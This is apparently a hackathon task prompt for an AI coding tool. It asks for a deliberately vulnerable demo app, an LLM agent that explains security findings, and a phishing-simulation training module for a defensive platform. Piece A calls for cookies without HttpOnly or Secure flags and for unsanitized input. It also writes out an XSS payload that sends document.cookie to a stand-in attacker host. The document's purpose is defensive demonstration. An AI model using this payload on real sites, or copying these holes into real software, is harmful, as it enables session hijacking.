# Part Prompts — one per person

Each person pastes **only their section** into their AI coding tool (Claude Code, Cursor, etc.). Each prompt is self-contained: it tells the AI what to build, what to mock, and how to know it's done — without needing anyone else's code to exist yet.

Before pasting: also give your coding AI the files `01_ARCHITECTURE.md` and `02_INTEGRATION_README.md` from this repo as context — they define the schema and contracts your prompt refers to.

---

## PART 4 — LLM Explanation Agent + Vulnerable Demo App + Behavioral Training Module

```
You are building three small, related pieces for a hackathon security platform
called ShieldForge: the deliberately-vulnerable demo victim app, the LLM agent
that turns findings into plain-English incident reports, and a minimal
behavioral-training module. This is module 4 of 4. Read
02_INTEGRATION_README.md (Boundary 5, 6) for the exact contracts.

IMPORTANT SCOPE NOTE: the vulnerable app and attack payloads you build here are
for demonstrating your OWN platform catching issues on your OWN test
deployment, for a hackathon judged on defensive security tooling. Do not point
any of this at real third-party sites, real user data, or production services.

GOAL
Three small Next.js pieces, each independently testable:

PIECE A — Vulnerable demo app (`victim-app/`), deployed standalone to Vercel
1. A tiny app (a guestbook/comment page is enough) with two DELIBERATE
   weaknesses, clearly commented as intentional:
   - On "login" (can be a fake, no real auth needed), set a session cookie
     WITHOUT `HttpOnly` or `Secure` flags.
   - A comment/input field that renders user input without sanitization
     (stored or reflected XSS), so a payload like
     `<script>fetch('https://attacker.vercel.app/c?'+document.cookie)</script>`
     actually executes.
2. This app must run standalone, with no dependency on anything else — it's
   just a normal (deliberately insecure) Next.js app.

PIECE B — LLM explanation agent (`llm-agent/`)
1. An API route `POST /api/explain` that takes a `findings`-shaped JSON
   (exact shape in 02_INTEGRATION_README.md Boundary 5) and returns an
   `ai_summary` string: 2-4 sentences, plain English, explaining what
   happened, why it matters, and a recommended fix. No jargon dump — write
   for a non-security founder reading their own dashboard.
2. Call OpenRouter first (model: your choice, something fast/cheap like a
   Llama or Mistral variant). On error or >4s timeout, fall back to Groq.
   If you have time, add NVIDIA NIM as a third fallback or for an
   embeddings-based "similar past incidents" feature — optional, don't block
   on it.
3. A polling or webhook mechanism that watches the `findings` table for rows
   where `ai_summary is null`, calls `/api/explain`, and writes the result
   back. Polling every 5-10s is fine and simpler than webhooks under time
   pressure — use polling.

PIECE C — Behavioral training module (`llm-agent/training/` or similar)
1. A "phishing simulation" trigger: a function that creates `training_events`
   rows of type `phishing_sent` for a list of `training_users`, and a simple
   tracking link/endpoint that records `phishing_clicked` when visited.
2. Risk scoring: a simple rule (e.g. +10 per click, -2 per week without a
   click, floor at 0) that updates `training_users.risk_score`.
3. Adaptive assignment: when a user's risk_score crosses a threshold (e.g.
   30), insert a `lesson_assigned` training_event. A "lesson" can just be a
   static markdown tip for the hackathon — the point is the automated
   trigger, not lesson content quality.

CONSTRAINTS
- Piece A must be deployable and demoable with zero dependency on anything else.
- Piece B must be testable with a hardcoded mock finding JSON — don't wait for
  the real `findings` table to have data.
- Piece C must be testable by directly inserting/reading `training_*` rows.

ACCEPTANCE TESTS (must pass before you call this done)
- [ ] Victim app deployed standalone; manually confirm the session cookie is
      missing HttpOnly/Secure (check browser devtools) and the XSS payload
      actually executes in a test browser tab.
- [ ] `POST /api/explain` with the mock finding JSON from
      02_INTEGRATION_README.md returns a coherent 2-4 sentence English
      explanation.
- [ ] Killing/invalidating the OpenRouter key and re-running the same request
      successfully falls back to Groq.
- [ ] Running the polling loop against a Supabase table with one seeded
      `findings` row (ai_summary null) results in that row getting a real
      ai_summary within one polling interval.
- [ ] Triggering the phishing simulation function creates the expected
      `training_events` rows; simulating 3 clicks for one user raises their
      risk_score and triggers a `lesson_assigned` event.

Build it now. Ask me one clarifying question only if something above is
genuinely ambiguous — otherwise pick the sensible default and build.
```
